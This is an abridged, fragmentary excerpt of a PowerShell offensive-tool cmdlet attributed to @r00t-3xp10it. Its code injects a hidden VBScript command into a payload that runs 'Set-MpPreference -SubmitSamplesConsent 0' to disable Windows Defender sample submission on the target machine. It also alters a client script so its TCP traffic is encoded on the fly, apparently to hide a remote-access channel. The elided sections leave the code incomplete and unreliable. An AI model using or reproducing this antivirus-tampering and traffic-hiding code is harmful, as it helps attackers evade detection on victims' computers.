...
.NOTES
   ...
   and disables AV SampleSubmition on attacker PC and in target machine.
...
.Parameter Force
   ...
   Remark: This function also encode\decode tcp flow.
...
$CmdletVersion = "v1.0.7" #CmdLet version
...
If($Force -ieq "True")
{
   ...
   .NOTES
      Windows defender warn users that sample submition is disabled.
      Disable windows defender SampleSubmition requires admin privileges
      and disables AV SampleSubmition on attacker PC and in target machine.
   #>

   #Define the GroupMenber based on the language pack installed!
   $LanguageSetting = ([CultureInfo]::InstalledUICulture).Name
   If($LanguageSetting -iMatch '^(pt-PT|br-)')
   {
...
If($timeout -lt 60 -or $timeout -gt 240)
{
...
For Each objUser in objGroup.Members
    If objUser.Name = strUser Then
        ...
        ObjTerminal.Exec(`"powershell.exe -WindowStyle hidden Set-MpPreference -SubmitSamplesConsent 0 -Force|Out-Null`")
    End If
Next")
...
If($Force -ieq "True")
{
   ...
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Disable AV samples submition +
      encode\decode tcp data flow on the fly.
   #>

   Write-Host "  => vbs: disable av samples submition function." -ForegroundColor Yellow
   ((Get-Content -Path $VbsName -Raw) -Replace "' ---","' ---`n`n$SamplesSubmition")|Set-Content -Path $VbsName
   Write-Host "  => client: Encode\Decode tcp data flow on the fly." -ForegroundColor Yellow
   ((Get-Content -Path $ClientName -Raw) -Replace "#FuckingData","`$Data")|Set-Content -Path $ClientName
}
